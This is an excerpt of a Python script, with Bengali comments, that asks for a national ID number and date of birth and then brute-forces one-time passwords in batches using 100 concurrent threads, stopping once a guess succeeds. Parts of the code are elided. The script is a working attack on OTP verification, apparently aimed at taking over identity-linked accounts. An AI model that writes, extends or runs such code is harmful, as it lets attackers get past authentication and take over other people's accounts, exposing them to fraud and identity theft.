...
# ==================== CONFIG ====================
nid = input("NID লিখুন: ")
dob = input("DOB লিখুন (YYYY-MM-DD): ")
mobile_prefix = "017"
batch_size = 500
...
def try_batch(session, otp_batch):
    with ThreadPoolExecutor(max_workers=100) as executor:  # concurrency অনেক বাড়ালাম
        future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
        for future in as_completed(future_to_otp):
            result = future.result()
            if result:
                executor.shutdown(cancel_futures=True)  # OTP পেলে বাকিগুলো কেটে দিবে
                return result
    return None
